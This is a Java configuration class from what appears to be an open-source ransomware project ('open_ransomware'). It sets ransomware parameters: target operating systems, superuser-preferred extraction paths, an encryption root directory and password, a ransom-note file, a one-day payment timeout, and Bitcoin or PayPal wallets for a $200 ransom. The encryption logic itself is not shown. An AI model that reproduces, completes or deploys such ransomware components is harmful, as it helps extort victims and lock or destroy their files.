package com.bechris100.open_ransomware;

import com.bechris100.open_ransomware.billing.BillingType;
import com.bechris100.open_ransomware.utils.OperatingSystem;

import java.util.ArrayList;
import java.util.List;

public class Configuration {

    public static class OperatingSystem {

        public static List<String> SUPPORTED = new ArrayList<>();
        public static String TARGETS = "";

    }

    public static class ExtractLocation {

        public static boolean MAKE_DIRS = true;
        public static boolean PREFER_SUPER_USER = true;

        public static class Locations {

            public static com.bechris100.open_ransomware.utils.OperatingSystem OPERATING_SYSTEM;

            public static String SUPER_USER_LOCATION = "";
            public static String LOCAL_USER_LOCATION = "";
        }

    }

    public static class Encryption {

        public static boolean SPAWN_THREADS = true;
        public static String ROOT_DIR = "";
        public static String PASSWORD = "";

    }

    public static class InjectionConfigs {

        public static String RES_MESSAGE_FILE = "res/message.txt";

        public static class Timeout {

            public static boolean ENABLED = true;
            public static int WEEKS = 0;
            public static int DAYS = 1;
            public static int HOURS = 0;
            public static int MINUTES = 0;
            public static int SECONDS = 0;
            public static int MILLISECONDS = 0;

        }

    }

    public static class Billing {

        public static BillingType PREFERRED_TYPE = BillingType.BITCOIN;
        public static String BITCOIN_WALLET = "";
        public static String PAYPAL_ADDRESS = "";
        public static double AMOUNT_DOLLAR = 200.00;

    }

}
